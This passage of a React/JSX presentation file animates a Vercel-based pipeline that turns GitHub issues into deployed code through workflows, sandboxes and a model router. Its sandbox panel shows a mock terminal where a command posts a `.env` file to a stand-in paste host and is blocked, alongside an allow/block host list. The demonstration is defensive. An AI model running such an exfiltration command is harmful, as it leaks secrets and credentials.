import { motion } from 'motion/react';
import { at, Replay, useEntries, Code, Label, Model, Kicker, Tick, Token, Vercel, IssueIcon, PrIcon, later, box } from './kit.jsx';

/* ------------------------------------------------------------------ *
 * The platform — what the factory is made of. The map and the seven
 * workflows are a chapter of their own; every other panel here is one
 * Vercel piece explained on the ship run's rail (ship.jsx), at the
 * station where it happens, so each is laid out for the rail's 1440×460
 * panel: the webhook and Jev at Triage, the sandbox at Plan, the durable
 * trace at Build, the climb at the Gate, the merge hook at Merge.
 * ------------------------------------------------------------------ */

export const WORKFLOWS = {
  ship: '🏭', review: '🔍', qa: '🧪', screenshots: '📸', respond: '💬', verify: '✅', warm: '🔥',
};

/** A workflow, as a chip. */
export function Wf({ name, children, className = '', style }) {
  return (
    <span className={`inline-flex items-center gap-1.5 whitespace-nowrap rounded-lg border border-violet-400/40 bg-violet-500/10 px-2.5 py-1 font-mono text-[15px] text-violet-100 ${className}`} style={style}>
      <span className="text-[14px]">{WORKFLOWS[name]}</span>{children ?? name}
    </span>
  );
}

/** A Vercel product's panel: the mark, its name, what it is here. */
function Product({ name, sub, glow, className = '', style, children }) {
  return (
    <div className={`flex flex-col rounded-2xl border ${glow ? 'pz-glow border-violet-400/60 bg-raised' : 'border-hairline bg-surface'} ${className}`} style={style}>
      <div className="flex items-center gap-2.5 border-b border-hairline px-5 py-3">
        <Vercel className="size-4 text-ink" />
        <span className="font-display text-[21px] text-ink">{name}</span>
        <span className="ml-auto text-[14px] text-faint">{sub}</span>
      </div>
      <div className="min-h-0 flex-1 px-5 py-3.5">{children}</div>
    </div>
  );
}

/* ---------------------------- the map ----------------------------- */

const EDGES = [
  { d: 'M370 240 L450 240', label: 'webhook', lx: 410, ly: 228, at: 900 },
  { d: 'M950 205 L1030 205', label: 'forks', lx: 990, ly: 193, at: 1500 },
  { d: 'M1280 310 L1280 390', label: 'model calls', lx: 1340, ly: 355, at: 1900 },
  { d: 'M370 480 L450 480', label: 'builds', lx: 410, ly: 468, at: 2300 },
];

function Machine({ name, mode, delay }) {
  return (
    <div className="pz-pop rounded-xl border border-hairline bg-raised px-3 py-3" style={later(delay)}>
      <div className="flex items-center justify-between gap-1">
        <span className="whitespace-nowrap font-mono text-[15px] text-ink">{name}</span>
      </div>
    </div>
  );
}

function Map() {
  return (
    <>
      <svg viewBox="0 0 1600 900" className="pointer-events-none absolute inset-0" aria-hidden="true">
        {EDGES.map((e) => (
          <g key={e.d}>
            <path d={e.d} pathLength="1" className="pz-draw-in" fill="none" stroke={e.back ? '#3f4560' : '#6d28d9'} strokeWidth="3" strokeDasharray={e.back ? undefined : undefined} style={later(e.at)} />
            <g className="pz-appear" style={later(e.at + 900)}>
              <path d={e.d} pathLength="1" className="pz-flow" fill="none" stroke={e.back ? '#9aa2b8' : '#c4b5fd'} strokeWidth="3" />
              <text x={e.lx} y={e.ly} textAnchor="middle" fill="#9aa2b8" fontSize="12.5" fontFamily="JetBrains Mono, monospace">{e.label}</text>
            </g>
          </g>
        ))}
      </svg>

      {/* GitHub: the only thing a person touches */}
      <div style={at(70, 150, 300, 380)} className={`${box} pz-appear flex flex-col`}>
        <div className="flex items-center gap-2.5 border-b border-hairline px-5 py-3">
          <span className="grid size-6 place-items-center rounded-full bg-ink text-[13px] text-ground" aria-hidden="true">●</span>
          <span className="font-display text-[21px] text-ink">GitHub</span>
        </div>
        <div className="flex flex-1 flex-col gap-3 px-5 py-4">
          <div className="rounded-xl border border-hairline bg-raised px-4 py-3.5">
            <div className="flex items-center gap-2 text-[19px] text-ink"><IssueIcon className="size-4 text-emerald-400" /> Issue #140</div>
            <div className="mt-1.5"><Label name="ready-for-ai" className="pz-pop text-[12px]" /></div>
          </div>
          <div className="pz-appear rounded-xl border border-hairline bg-raised px-4 py-3.5" style={later(3200)}>
            <div className="flex items-center gap-2 text-[19px] text-ink"><PrIcon className="size-4 text-emerald-400" /> Pull request #142</div>
          </div>
          <div className="mt-auto font-display text-[22px] leading-tight text-ink">No GitHub Actions</div>
        </div>
      </div>

      <Product name="The factory" sub="seven Vercel Workflows" glow style={at(450, 100, 500, 210)} className="pz-appear">
        <div className="flex flex-wrap gap-2">
          {Object.keys(WORKFLOWS).map((w, i) => <Wf key={w} name={w} className="pz-pop" style={later(1300 + i * 90)} />)}
        </div>
      </Product>

      <Product name="Vercel Sandbox" sub="a fresh machine per run" style={at(1030, 100, 500, 210)} className="pz-appear">
        <div className="grid grid-cols-3 gap-2">
          <Machine name="ship-140" mode="push" delay={1900} />
          <Machine name="review-142" mode="read" delay={2050} />
          <Machine name="qa-142" mode="read" delay={2200} />
        </div>
      </Product>

      <Product name="The app" sub="built by Vercel on every push" style={at(450, 390, 500, 190)} className="pz-appear">
        <div className="space-y-2.5 text-[18px]">
          <div className="flex items-center gap-3 rounded-lg bg-raised px-3 py-2"><Code>main</Code><span className="text-muted">→ production</span></div>
          <div className="pz-appear flex items-center gap-3 rounded-lg bg-raised px-3 py-2" style={later(2600)}><span className="font-mono text-[15px] text-emerald-300">every pull request</span><span className="text-muted">→ its own preview</span></div>
        </div>
      </Product>

      <Product name="AI Gateway" sub="every model, one door" style={at(1030, 390, 500, 190)} className="pz-appear">
        <div className="flex flex-wrap gap-1.5">
          {['haiku', 'glm', 'deepseek', 'sonnet', 'opus'].map((m, i) => <Model key={m} m={m} className="pz-pop" style={later(2200 + i * 90)} />)}
        </div>
        <div className="pz-appear mt-3.5 flex items-center gap-2 text-[17px] text-muted" style={later(2900)}>
          <span className="rounded-full border border-amber-400/50 bg-amber-500/15 px-2.5 py-0.5 font-mono text-[13px] text-amber-200">Jev</span>
          picks one for each step
        </div>
      </Product>

      {/* the ticket leaves GitHub by the webhook, and is inside the factory */}
      <Token className="absolute" initial={{ left: 250, top: 226, opacity: 0, scale: 0.6 }} animate={{ left: [250, 250, 470], opacity: [0, 1, 1, 0], scale: 1 }} transition={{ duration: 2.2, delay: 0.5, times: [0, 0.2, 0.8, 1], ease: [0.65, 0, 0.35, 1] }} />
    </>
  );
}

/* --------------------------- the webhook -------------------------- */

/* Triage in one picture: the label reaches the factory's one door, ship starts,
 * and Jev makes the run's two decisions before any machine exists. */
function Hop({ delay }) {
  return (
    <svg viewBox="0 0 90 20" className="h-5 w-[90px] shrink-0" aria-hidden="true">
      <path d="M4 10 L80 10" pathLength="1" className="pz-draw-in" fill="none" stroke="#6d28d9" strokeWidth="2.5" style={later(delay)} />
      <g className="pz-appear" style={later(delay + 600)}>
        <path d="M4 10 L80 10" pathLength="1" className="pz-flow" fill="none" stroke="#c4b5fd" strokeWidth="2.5" />
        <path d="M76 5 L84 10 L76 15" fill="none" stroke="#c4b5fd" strokeWidth="2.5" />
      </g>
    </svg>
  );
}

const JEV = 'rounded-full border border-amber-400/60 bg-amber-500/20 px-3 py-0.5 font-mono text-[17px] text-amber-100';

const DECISIONS = [
  { who: null, icon: '🏷️', title: 'Claims the ticket', sub: 'a second label starts nothing', ms: null },
  { who: 'Jev', title: 'How big is this ticket?', sub: 'fast · small · full', ms: '300 ms' },
  { who: 'Jev', title: 'Which model for each step?', sub: 'the cheapest that can do it', ms: '300 ms' },
];

export function Switchboard() {
  return (
    <div className="flex h-full flex-col gap-4">
      <div className="flex h-[176px] items-stretch">
        <div className={`${box} pz-appear flex flex-1 flex-col justify-center px-6`}>
          <Kicker>GitHub</Kicker>
          <div className="mt-2 flex items-center gap-2.5 text-[22px] text-ink"><IssueIcon className="size-5 text-emerald-400" /> Issue #140 gets</div>
          <div className="mt-2"><Label name="ready-for-ai" className="pz-pop text-[15px]" style={later(400)} /></div>
        </div>
        <div className="flex items-center"><Hop delay={700} /></div>
        <div className="pz-glow pz-appear flex flex-1 flex-col justify-center rounded-2xl border border-violet-400/60 bg-raised px-6" style={later(900)}>
          <div className="flex items-center gap-2.5"><Vercel className="size-4 text-ink" /><Kicker>The factory’s one door</Kicker></div>
          <div className="mt-2"><Code className="whitespace-nowrap text-[22px]">POST /api/github</Code></div>
          <div className="mt-3 flex gap-x-4 text-[16px] text-muted">
            {['signed', 'one repository', 'writers only'].map((c) => <span key={c} className="flex items-center gap-1.5 whitespace-nowrap"><Tick className="size-5 text-[11px]" />{c}</span>)}
          </div>
        </div>
        <div className="flex items-center"><Hop delay={1500} /></div>
        <div className={`${box} pz-appear flex flex-1 flex-col justify-center px-6`} style={later(1900)}>
          <Kicker>A Vercel Workflow starts</Kicker>
          <div className="mt-2 flex items-center gap-3"><span className="text-[36px] leading-none">🏭</span><span className="font-mono text-[32px] text-ink">ship</span></div>
        </div>
      </div>

      <div className="pz-appear flex items-center gap-3" style={later(2500)}>
        <Kicker>Then, before any machine starts</Kicker>
        <span className="h-px flex-1 bg-hairline" />
        <span className="font-display text-[26px] text-ink">about a second</span>
      </div>
      <div className="grid flex-1 grid-cols-3 gap-4">
        {DECISIONS.map((d, i) => (
          <div key={d.title} className={`pz-appear flex flex-col justify-center rounded-2xl border px-6 ${d.who ? 'border-amber-400/50 bg-raised' : 'border-hairline bg-surface'}`} style={later(2800 + i * 350)}>
            <div className="flex items-center gap-3">
              {d.who ? <span className={JEV}>{d.who}</span> : <span className="text-[26px]">{d.icon}</span>}
              {d.ms && <span className="ml-auto font-mono text-[18px] text-amber-300">{d.ms}</span>}
            </div>
            <div className="mt-3 font-display text-[25px] leading-tight text-ink">{d.title}</div>
            <div className="mt-1 text-[18px] text-muted">{d.sub}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ------------------------- seven workflows ------------------------ */

const SEVEN = [
  { name: 'ship', mode: 'push', when: 'ready-for-ai · /ship', does: 'a ticket, all the way to production' },
  { name: 'review', mode: 'read', when: 'a pull request opens · /review', does: 'reads the diff, proves what it flags' },
  { name: 'qa', mode: 'read', when: 'with review', does: 'tries to break it on the preview' },
  { name: 'screenshots', mode: 'none', when: 'with review · /screenshots', does: 'before and after, on the pull request' },
  { name: 'respond', mode: 'push', when: '/fix … on a pull request', does: 'makes the change you ask for' },
  { name: 'verify', mode: 'none', when: 'every push', does: 'runs the tests, with no credential' },
  { name: 'warm', mode: null, when: 'push to main · daily', does: 'rebuilds the sandbox every run forks' },
];


function Seven() {
  return (
    <div className="pz-glow flex h-full flex-col overflow-hidden rounded-3xl border border-violet-400/60 bg-raised">
      {/* the same header as the factory's box on the map, so the zoom lands on itself */}
      <div className="flex items-center gap-3 border-b border-hairline px-6 py-3">
        <Vercel className="size-5 text-ink" /><span className="font-display text-[26px] text-ink">The factory</span>
        <span className="ml-auto text-[17px] text-faint">seven Vercel Workflows</span>
      </div>
      <div className="grid min-h-0 flex-1 grid-cols-4 grid-rows-2 gap-3.5 p-4">
      {SEVEN.map((w, i) => (
        <motion.div
          key={w.name}
          className={`${box} flex flex-col justify-center px-5 py-3 ${w.name === 'ship' ? 'border-violet-400/50' : ''}`}
          initial={{ opacity: 0, y: 40, rotateX: -20 }}
          animate={{ opacity: 1, y: 0, rotateX: 0 }}
          transition={{ delay: 0.75 + i * 0.07, type: 'spring', stiffness: 130, damping: 17 }}
        >
          <div className="flex items-center gap-3">
            <span className="text-[38px] leading-none">{WORKFLOWS[w.name]}</span>
            <span className="font-mono text-[28px] text-ink">{w.name}</span>
          </div>
          <div className="mt-3 font-mono text-[15px] text-violet-300">{w.when}</div>
          <div className="mt-2 text-[21px] leading-snug text-muted">{w.does}</div>
        </motion.div>
      ))}
      {/* not a workflow: a note on what one is, so it is drawn as a note */}
      <motion.div
        className="flex flex-col justify-center rounded-2xl border border-dashed border-hairline px-5 py-3"
        initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 1.5, duration: 0.6 }}
      >
        <div className="flex items-center gap-2 whitespace-nowrap text-[13px] uppercase tracking-[0.12em] text-faint"><Vercel className="size-3" /> What makes it a Vercel Workflow</div>
        <div className="mt-3 text-[19px] leading-snug text-muted">TypeScript, with <span className="text-ink">every step saved</span> — so a run is</div>
        <div className="mt-2.5 flex flex-wrap gap-1.5">
          {['persisted', 'observable', 'resumable'].map((t) => <span key={t} className="rounded-full border border-violet-400/40 bg-violet-500/10 px-2.5 py-0.5 font-mono text-[14px] text-violet-200">{t}</span>)}
        </div>
      </motion.div>
      </div>
    </div>
  );
}

// the factory's box on the map, and how far the camera pushes in to fill the panel with it
const FACTORY = { cx: 700, cy: 205 };
const ZOOM = 1440 / 500;

function MapScene({ step }) {
  const mapEntries = useEntries(step === 0);
  const sevenEntries = useEntries(step === 1);
  return (
    <>
      {/* the camera pushes into the factory's box, and the box opens into its seven workflows */}
      <motion.div
        style={{ ...at(0, 0, 1600, 900), transformOrigin: `${FACTORY.cx}px ${FACTORY.cy}px`, pointerEvents: step === 0 ? undefined : 'none' }}
        aria-hidden={step === 0 ? undefined : true}
        initial={false}
        animate={step === 0 ? { scale: 1, x: 0, y: 0, opacity: 1 } : { scale: ZOOM, x: 800 - FACTORY.cx, y: 335 - FACTORY.cy, opacity: 0 }}
        transition={{ duration: 0.9, ease: [0.65, 0, 0.35, 1], opacity: { duration: step === 0 ? 0.5 : 0.7, delay: step === 0 ? 0.3 : 0.15 } }}
      >
        <div key={mapEntries} className="contents"><Map /></div>
      </motion.div>
      <motion.div
        style={{ ...at(80, 70, 1440, 530), transformOrigin: `${FACTORY.cx - 80}px ${FACTORY.cy - 70}px`, pointerEvents: step === 1 ? undefined : 'none' }}
        aria-hidden={step === 1 ? undefined : true}
        initial={false}
        animate={step === 1 ? { scale: 1, opacity: 1 } : { scale: step === 0 ? 1 / ZOOM : 1, opacity: 0 }}
        transition={{ duration: 0.9, ease: [0.65, 0, 0.35, 1], opacity: { duration: 0.5, delay: step === 1 ? 0.35 : 0 } }}
      >
        <div key={sevenEntries} className="contents"><Seven /></div>
      </motion.div>
    </>
  );
}

/* ------------------------- Vercel Workflows ----------------------- */

// [step, start %, width %] along one ship run — the real step names (factory/lib/phases.ts)
const TRACE = [
  ['triageIssue', 0, 1.5], ['chooseModels', 1.5, 1.5], ['prepareSandbox', 3, 3], ['makeBranch', 6, 2],
  ['spec', 8, 12], ['implement', 20, 34], ['gate', 54, 12], ['codeAudit', 66, 12],
  ['skeptic', 78, 6], ['skeptic', 78, 7.5], ['pushBranch', 86, 3], ['openPullRequest', 89, 4],
];
const MS = 44; // ms of animation per % of the run
const T0 = 500;
const CRASH = 38;
const CRASH_AT = T0 + CRASH * MS;
const NAME_W = 258;

function Trace() {
  return (
    <div className="overflow-hidden rounded-2xl border border-hairline bg-[#0d0f15] shadow-2xl shadow-black/50">
      <div className="flex items-center gap-3 border-b border-hairline bg-surface px-5 py-2.5">
        <Vercel className="size-3.5 text-ink" />
        <span className="font-mono text-[14px] text-muted">nam-2026-factory / Workflows / <span className="text-ink">ship</span></span>
        <span className="ml-auto flex items-center gap-2 font-mono text-[13px] text-faint">issue=140 <span className="text-hairline">·</span> phase=Build <span className="text-hairline">·</span> spend_usd=0.07</span>
      </div>
      <div className="relative px-5 py-2.5">
        {TRACE.map(([name, start, width], i) => {
          const recorded = start + width <= CRASH;
          const spans = start < CRASH && start + width > CRASH;
          return (
            <div key={i} className="grid h-[31px] items-center" style={{ gridTemplateColumns: `${NAME_W}px 1fr` }}>
              <span className="flex items-center gap-2 font-mono text-[15px] text-muted">
                <span className="text-emerald-400/80">‹›</span>{name}
                {recorded && <span className="pz-pop ml-auto mr-3 rounded bg-emerald-500/15 px-1.5 text-[12px] text-emerald-300" style={later(CRASH_AT + 500 + i * 110)}>recorded</span>}
              </span>
              <div className="relative h-[18px]">
                {spans ? (
                  <>
                    <span className="pz-fill absolute inset-y-0 rounded-l bg-emerald-400/60 ring-1 ring-emerald-300/70" style={{ left: `${start}%`, width: `${CRASH - start}%`, animationDuration: `${(CRASH - start) * MS}ms`, animationDelay: `${T0 + start * MS}ms`, animationTimingFunction: 'linear' }} />
                    <span className="pz-fill absolute inset-y-0 rounded-r bg-emerald-400/60 ring-1 ring-emerald-300/70" style={{ left: `${CRASH + 1.2}%`, width: `${start + width - CRASH - 1.2}%`, animationDuration: `${(start + width - CRASH) * MS}ms`, animationDelay: `${CRASH_AT + 1500}ms`, animationTimingFunction: 'linear' }} />
                    <span className="pz-appear absolute -top-[19px] whitespace-nowrap font-mono text-[12px] text-amber-300" style={{ left: `${CRASH + 2}%`, ...later(CRASH_AT + 1500) }}>the same step: it never stopped running in the sandbox</span>
                  </>
                ) : (
                  <span className="pz-fill absolute inset-y-0 rounded bg-emerald-400/60 ring-1 ring-emerald-300/70" style={{ left: `${start}%`, width: `${width}%`, animationDuration: `${width * MS}ms`, animationDelay: `${(start > CRASH ? 1500 : 0) + T0 + start * MS}ms`, animationTimingFunction: 'linear' }} />
                )}
              </div>
            </div>
          );
        })}
        {/* the crash: a redeploy in the middle of the build */}
        <div className="pz-appear pointer-events-none absolute bottom-2 top-1" style={{ left: `calc(20px + ${NAME_W}px + (100% - ${NAME_W + 40}px) * ${CRASH / 100})`, ...later(CRASH_AT) }}>
          <div className="h-full w-0.5 bg-rose-400" />
          <span className="pz-stamp absolute left-2 top-[44px] whitespace-nowrap rounded-md border-2 border-rose-400 bg-ground/90 px-2 py-0.5 font-mono text-[12px] font-bold uppercase tracking-[0.15em] text-rose-300" style={later(CRASH_AT + 100)}>💥 the function is redeployed</span>
        </div>
      </div>
    </div>
  );
}

const DURABLE = [
  ['📼', 'Every step is recorded', 'A finished step never runs twice: replay reads the event log.'],
  ['🧵', 'No function waits on an agent', 'The agent runs detached in the sandbox; the step checks in.'],
  ['🛟', 'A lost machine comes back', 'A timed-out sandbox resumes from its snapshot.'],
];

export function Durable() {
  return (
    <div className="grid h-full grid-cols-[1fr_470px] gap-6">
      <Trace />
      <div className="flex flex-col gap-3">
        {DURABLE.map(([icon, title, body], i) => (
          <div key={title} className={`${box} pz-appear flex flex-1 flex-col justify-center px-5`} style={later(CRASH_AT + 900 + i * 500)}>
            <div className="flex items-center gap-3"><span className="text-[24px]">{icon}</span><span className="font-display text-[23px] text-ink">{title}</span></div>
            <div className="mt-1.5 text-[18px] leading-snug text-muted">{body}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

/* One picture: what the run costs over time. Busy while it works, a flat zero
 * while it waits for a person, a short burst when the merge wakes it. */
const WORK = 'M40 250 C 70 250, 80 130, 112 130 S 150 190, 182 160 S 232 70, 272 100 S 332 180, 362 140 S 410 250, 432 250';
const WAKE = 'M1080 250 C 1100 250, 1112 165, 1142 165 S 1196 250, 1232 250';
const MOMENTS = [
  { x: 40, icon: '🏷️', t: 'labelled', d: 300 },
  { x: 432, icon: '🔀', t: 'pull request opens', d: 1500 },
  { x: 1080, icon: '👤', t: 'you click merge', d: 3000 },
  { x: 1232, icon: '🚀', t: 'live in production', d: 3900 },
];

export function Asleep() {
  return (
    <div className="flex h-full flex-col gap-4">
      <div className={`${box} relative flex-1 overflow-hidden`}>
        <svg viewBox="0 0 1440 372" className="absolute inset-0 size-full" aria-hidden="true">
          <defs>
            <linearGradient id="pz-work" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#8b5cf6" stopOpacity="0.55" /><stop offset="100%" stopColor="#8b5cf6" stopOpacity="0" /></linearGradient>
            <linearGradient id="pz-wake" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#34d399" stopOpacity="0.55" /><stop offset="100%" stopColor="#34d399" stopOpacity="0" /></linearGradient>
          </defs>
          <line x1="40" y1="250" x2="1400" y2="250" stroke="#333950" strokeWidth="2" />
          {/* the work */}
          <path d={`${WORK} Z`} fill="url(#pz-work)" className="pz-appear" style={later(1100)} />
          <path d={WORK} pathLength="1" className="pz-draw-in" fill="none" stroke="#a78bfa" strokeWidth="3.5" style={{ animationDuration: '1200ms', ...later(300) }} />
          {/* the wait: nothing */}
          <path d="M432 250 L1080 250" pathLength="1" className="pz-draw-in" fill="none" stroke="#6d5fa0" strokeWidth="3.5" strokeDasharray="0.012 0.012" style={{ animationDuration: '1400ms', ...later(1600) }} />
          {/* the wake */}
          <path d={`${WAKE} Z`} fill="url(#pz-wake)" className="pz-appear" style={later(3500)} />
          <path d={WAKE} pathLength="1" className="pz-draw-in" fill="none" stroke="#34d399" strokeWidth="3.5" style={{ animationDuration: '600ms', ...later(3000) }} />
          <path d="M1232 250 L1400 250" fill="none" stroke="#333950" strokeWidth="3.5" />
          {MOMENTS.map((m) => <circle key={m.t} cx={m.x} cy="250" r="7" fill="#12141c" stroke="#c4b5fd" strokeWidth="3" className="pz-appear" style={later(m.d)} />)}
        </svg>

        <div className="absolute left-[24px] top-[14px] font-mono text-[12px] uppercase tracking-[0.18em] text-faint">what the run is using</div>
        <div className="pz-appear absolute left-[9%] top-[26px] w-[220px] text-center font-display text-[24px] text-violet-200" style={later(900)}>the run works</div>
        <div className="pz-appear absolute left-[30%] top-[52px] flex w-[45%] flex-col items-center" style={later(2000)}>
          <div className="flex items-center gap-4"><span className="pz-float text-[40px]">💤</span><span className="font-display text-[92px] leading-none text-ink">$0</span></div>
          <div className="mt-1 text-[21px] text-muted">asleep, waiting for you: an hour, or the whole weekend</div>
          <div className="text-[16px] text-faint">no function running, no sandbox running</div>
        </div>
        <div className="pz-appear absolute right-[10%] top-[96px] w-[200px] text-center font-display text-[24px] text-emerald-200" style={later(3300)}>⚡ it wakes</div>

        {MOMENTS.map((m, i) => (
          <div key={m.t} className={`pz-appear absolute top-[272px] flex flex-col whitespace-nowrap ${i === 0 ? 'items-start' : '-translate-x-1/2 items-center'}`} style={{ left: `${(m.x / 1440) * 100}%`, ...later(m.d) }}>
            <span className="text-[22px]">{m.icon}</span>
            <span className="text-[17px] font-semibold text-ink">{m.t}</span>
          </div>
        ))}
      </div>
      <div className="pz-appear flex items-center gap-4 rounded-2xl border border-hairline bg-surface px-6 py-3 text-[18px] text-muted" style={later(4300)}>
        <Vercel className="size-4 shrink-0 text-ink" />
        <span>How: a <b className="text-ink">Vercel Workflow hook</b>. The run awaits it; GitHub’s merge webhook resumes it.</span>
        <Code className="ml-auto whitespace-nowrap text-[16px]">await merged</Code>
      </div>
    </div>
  );
}


/* --------------------------- Vercel Sandbox ----------------------- */

/* One picture: the run forks a ready machine, and that machine holds no keys —
 * the sandbox's proxy adds them on the way out, for a few hosts only. */
const WARM = ['the repository, cloned', 'npm ci, already done', 'Chromium, for Playwright', 'network locked'];

const HOSTS = [
  { ok: true, host: 'github.com', note: 'token added', key: true },
  { ok: true, host: 'ai-gateway.vercel.sh', note: 'key added', key: true },
  { ok: true, host: 'registry.npmjs.org' },
  { ok: true, host: 'this pull request’s preview' },
  { ok: false, host: 'anywhere else', note: 'blocked' },
  { ok: false, host: 'the upstream repository', note: 'blocked' },
];

export function Sandbox() {
  const rowY = (i) => 28 + i * 58;
  return (
    <div className="relative h-full">
      {/* the ready machine every run forks */}
      <div className="pz-appear absolute left-0 top-0 flex h-[348px] w-[290px] flex-col rounded-2xl border border-amber-400/50 bg-raised px-5 py-4">
        <div className="flex items-center gap-2.5"><span className="text-[26px]">🔥</span><span className="font-mono text-[23px] text-ink">orbit-warm</span></div>
        <div className="text-[14px] text-amber-200/80">rebuilt on every push to main</div>
        <div className="mt-4 space-y-3.5 text-[16px] text-muted">
          {WARM.map((l, i) => <div key={l} className="pz-appear flex items-center gap-2.5" style={later(250 + i * 150)}><Tick className="size-5 text-[11px]" />{l}</div>)}
        </div>
      </div>
      <div className="pz-appear absolute left-[290px] top-[150px] w-[60px] text-center" style={later(1000)}>
        <div className="font-mono text-[12px] leading-tight text-emerald-300">fork<br />seconds</div>
        <div className="text-[22px] leading-none text-violet-300">→</div>
      </div>

      {/* this run's machine, and what is (not) inside it */}
      <div className="pz-appear absolute left-[350px] top-0 flex h-[348px] w-[460px] flex-col overflow-hidden rounded-2xl border border-violet-400/60 bg-[#0d0f15]" style={later(1200)}>
        <div className="flex items-center gap-2.5 border-b border-hairline bg-surface px-5 py-2.5">
          <Vercel className="size-3.5 text-ink" /><span className="font-mono text-[15px] text-ink">ship-140</span>
          <span className="ml-auto font-mono text-[12px] text-faint">a Vercel Sandbox, for this run only</span>
        </div>
        <div className="space-y-1 px-5 py-3 font-mono text-[13.5px]">
          <div className="text-faint">$ env | grep TOKEN</div>
          <div className="pz-appear text-muted" style={later(1700)}>GH_TOKEN=<span className="text-amber-300">injected-by-the-sandbox-proxy</span></div>
          <div className="pz-appear whitespace-nowrap text-muted" style={later(1900)}>ANTHROPIC_AUTH_TOKEN=<span className="text-amber-300">injected-by-the-sandbox-proxy</span></div>
          <div className="pz-appear pt-1.5 text-faint" style={later(3300)}>$ git push origin issue-140-…</div>
          <div className="pz-appear text-emerald-300" style={later(3700)}>✓ pushed — the proxy added the token</div>
          <div className="pz-appear pt-1.5 text-faint" style={later(4100)}>$ curl https://paste.example -d @.env</div>
          <div className="pz-appear text-rose-300" style={later(4500)}>✕ could not resolve host</div>
        </div>
        <div className="pz-appear mx-5 mt-auto mb-4 rounded-xl border border-emerald-400/40 bg-emerald-500/10 px-4 py-2" style={later(2300)}>
          <div className="font-display text-[20px] leading-tight text-emerald-100">Nothing in here is worth stealing</div>
        </div>
      </div>

      {/* the proxy */}
      <div className="pz-appear absolute left-[870px] top-0 flex h-[348px] w-[56px] flex-col items-center justify-center rounded-2xl border border-violet-400/60 bg-raised" style={later(2000)}>
        <span className="text-[24px]">🔑</span>
        <span className="mt-3 font-mono text-[13px] uppercase tracking-[0.2em] text-violet-200 [writing-mode:vertical-rl]">sandbox proxy</span>
      </div>

      <svg viewBox="0 0 1440 460" className="pointer-events-none absolute inset-0 size-full" aria-hidden="true">
        {HOSTS.map((h, i) => {
          const y = rowY(i);
          const colour = h.ok ? '#c4b5fd' : '#fb7185';
          return (
            <g key={h.host}>
              <path d={`M810 ${y} L870 ${y}`} pathLength="1" className="pz-draw-in" fill="none" stroke={colour} strokeWidth="2.5" style={later(2400 + i * 180)} />
              {h.ok && (
                <g className="pz-appear" style={later(3000 + i * 180)}>
                  <path d={`M926 ${y} L972 ${y}`} pathLength="1" className="pz-flow" fill="none" stroke={colour} strokeWidth="2.5" />
                  <path d={`M966 ${y - 5} L974 ${y} L966 ${y + 5}`} fill="none" stroke={colour} strokeWidth="2.5" />
                </g>
              )}
            </g>
          );
        })}
      </svg>

      {HOSTS.map((h, i) => (
        <div key={h.host} className={`pz-appear absolute left-[982px] flex h-[46px] w-[458px] items-center gap-3 rounded-xl border px-4 ${h.ok ? 'border-hairline bg-surface' : 'border-rose-400/30 bg-rose-500/[0.06]'}`} style={{ top: rowY(i) - 23, ...later(2700 + i * 180) }}>
          <Tick ok={h.ok} className="size-6 text-[12px]" />
          <span className={`whitespace-nowrap font-mono text-[16px] ${h.ok ? 'text-ink' : 'text-rose-200'}`}>{h.host}</span>
          {h.note && <span className={`ml-auto flex items-center gap-1.5 whitespace-nowrap text-[14px] ${h.key ? 'text-amber-200' : 'text-faint'}`}>{h.key && <span>🔑</span>}{h.note}</span>}
        </div>
      ))}

      <div className="pz-appear absolute inset-x-0 bottom-0 flex h-[84px] items-center gap-5 rounded-2xl border border-hairline bg-surface px-6 text-[20px] text-muted" style={later(4800)}>
        {['fork', 'run its steps', 'deleted when the run ends'].map((l, i) => (
          <span key={l} className="flex items-center gap-5">{i > 0 && <span className="text-violet-300">→</span>}<b className="font-semibold text-ink">{l}</b></span>
        ))}
        <span className="ml-auto text-[17px] text-faint">every workflow gets its own, with only the access it needs</span>
      </div>
    </div>
  );
}


/* ------------------------ AI Gateway and Jev ---------------------- */

const PROFILES = [
  ['⚡', 'fast', 'text-emerald-300', 'one audit', '1 round'],
  ['🟢', 'small', 'text-sky-300', 'an audit, and a browser audit', '2 rounds'],
  ['🔵', 'full', 'text-fuchsia-300', 'a plan audit, then three auditors', '4 rounds'],
];

export function Sizing() {
  return (
    <div className="grid h-full grid-cols-[520px_1fr] gap-7">
      <div className="flex flex-col rounded-2xl border border-amber-400/50 bg-raised px-6 py-4">
        <div className="flex items-center gap-3">
          <span className="rounded-full border border-amber-400/60 bg-amber-500/20 px-4 py-1 font-mono text-[22px] text-amber-100">Jev</span>
          <span className="text-[18px] leading-tight text-muted">answers with odds, not prose</span>
        </div>
        <div className="pz-appear mt-5 rounded-xl bg-ground/60 px-4 py-3 text-[20px] text-ink" style={later(400)}>How big is ticket #140?</div>
        <div className="mt-5 space-y-3">
          {[['small', 55, true], ['fast', 31, false], ['full', 14, false]].map(([size, pct, pick], i) => (
            <div key={size} className="pz-appear grid grid-cols-[64px_1fr_56px] items-center gap-3" style={later(900 + i * 150)}>
              <span className={`font-mono text-[17px] ${pick ? 'text-ink' : 'text-faint'}`}>{size}</span>
              <span className="h-4 overflow-hidden rounded-full bg-overlay"><span className={`pz-fill block h-full rounded-full ${pick ? 'bg-gradient-to-r from-amber-400 to-emerald-300' : 'bg-faint/50'}`} style={{ width: `${pct}%`, animationDuration: '900ms', animationDelay: `${1000 + i * 150}ms` }} /></span>
              <span className={`text-right font-mono text-[16px] ${pick ? 'text-amber-300' : 'text-faint'}`}>{pct}%</span>
            </div>
          ))}
        </div>
        <div className="pz-appear mt-6 flex items-baseline gap-3" style={later(2000)}>
          <span className="font-display text-[44px] leading-none text-ink">small?</span>
          <span className="font-mono text-[17px] text-amber-300">55% sure · 300 ms</span>
        </div>
        <div className="pz-appear mt-auto text-[19px] leading-snug text-ink" style={later(2400)}><b className="text-amber-200">Under 60%</b>: the plan will decide.</div>
      </div>

      <div className="flex flex-col gap-3">
        <Kicker>Size = how much checking the ticket gets</Kicker>
        {PROFILES.map(([icon, name, tone, what, rounds], i) => (
          <div key={name} className={`${box} pz-appear flex flex-1 items-center gap-5 px-6`} style={later(2200 + i * 260)}>
            <span className="text-[30px]">{icon}</span>
            <span className={`w-[92px] font-display text-[30px] ${tone}`}>{name}</span>
